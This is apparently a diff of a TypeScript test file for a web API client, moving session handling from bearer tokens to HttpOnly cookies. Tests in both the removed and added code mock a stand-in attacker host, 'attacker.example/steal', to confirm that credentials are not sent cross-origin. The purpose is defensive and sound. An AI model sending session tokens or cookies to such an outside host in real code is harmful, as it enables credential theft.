@@ -5,8 +5,8 @@ import { server } from '@/test/msw/server';
 import { ApiClient } from './ApiClient';
 import type { IApiError } from './ApiClient';
 
-function createClient(token: string | null = null) {
-  return new ApiClient(API, { getToken: () => token });
+function createClient() {
+  return new ApiClient(API);
 }
 
 describe('ApiClient: сборка адреса', () => {
@@ -102,51 +102,8 @@ describe('ApiClient: сборка адреса', () => {
 });
 
 describe('ApiClient: заголовки', () => {
-  it('should send the bearer token when it is available', async () => {
-    let authorization: string | null = null;
-    server.use(
-      http.get(api('/users/me'), ({ request }) => {
-        authorization = request.headers.get('Authorization');
-        return HttpResponse.json({ id: 'user-1' });
-      })
-    );
-
-    await createClient('session-token-abc').get('/users/me');
-
-    expect(authorization).toBe('Bearer session-token-abc');
-  });
-
-  // Абсолютный адрес чужого origin — без токена (#871): иначе его увёл бы
-  // любой, кто сумел подсунуть клиенту свою ссылку.
-  it('does not send the token to another origin', async () => {
-    let authorization: string | null = 'не тронуто';
-    server.use(
-      http.get('https://attacker.example/steal', ({ request }) => {
-        authorization = request.headers.get('Authorization');
-        return HttpResponse.json({ ok: true });
-      })
-    );
-
-    await createClient('session-token-abc').get('https://attacker.example/steal');
-
-    expect(authorization).toBeNull();
-  });
-
-  it('keeps the token for an absolute address of its own origin', async () => {
-    let authorization: string | null = null;
-    server.use(
-      http.get(api('/users/me'), ({ request }) => {
-        authorization = request.headers.get('Authorization');
-        return HttpResponse.json({ id: 'user-1' });
-      })
-    );
-
-    await createClient('session-token-abc').get(api('/users/me'));
-
-    expect(authorization).toBe('Bearer session-token-abc');
-  });
-
-  it('should omit authorization without a token', async () => {
+  // Сессия — в HttpOnly-cookie (#705): токена у клиента нет, заголовка тоже.
+  it('не шлёт Authorization: сессию браузер отправляет в cookie', async () => {
     let authorization: string | null = 'не тронуто';
     server.use(
       http.get(api('/users/me'), ({ request }) => {
@@ -155,9 +112,42 @@ describe('ApiClient: заголовки', () => {
       })
     );
 
-    await createClient(null).get('/users/me');
+    await createClient().get('/users/me');
 
     expect(authorization).toBeNull();
+  });
+
+  // Cookie сессии — только своему серверу (#871): абсолютный адрес чужого
+  // origin получает запрос без неё.
+  it('cookie — только своему серверу: credentials same-origin для любого адреса', async () => {
+    const fetchSpy = vi.spyOn(globalThis, 'fetch');
+    server.use(
+      http.get(api('/users/me'), () => HttpResponse.json({ id: 'user-1' })),
+      http.get('https://attacker.example/steal', () => HttpResponse.json({ ok: true }))
+    );
+
+    await createClient().get('/users/me');
+    await createClient().get('https://attacker.example/steal');
+
+    expect(fetchSpy.mock.calls.map(([, init]) => init?.credentials)).toEqual([
+      'same-origin',
+      'same-origin',
+    ]);
+    fetchSpy.mockRestore();
+  });
+
+  it('заголовки вызова передаются как есть (обмен старого токена на cookie)', async () => {
+    let authorization: string | null = null;
+    server.use(
+      http.post(api('/auth/session'), ({ request }) => {
+        authorization = request.headers.get('Authorization');
+        return new HttpResponse(null, { status: 204 });
+      })
+    );
+
+    await createClient().post('/auth/session', undefined, { Authorization: 'Bearer legacy' });
+
+    expect(authorization).toBe('Bearer legacy');
   });
 
   it('should drop content-type when there is no body', async () => {
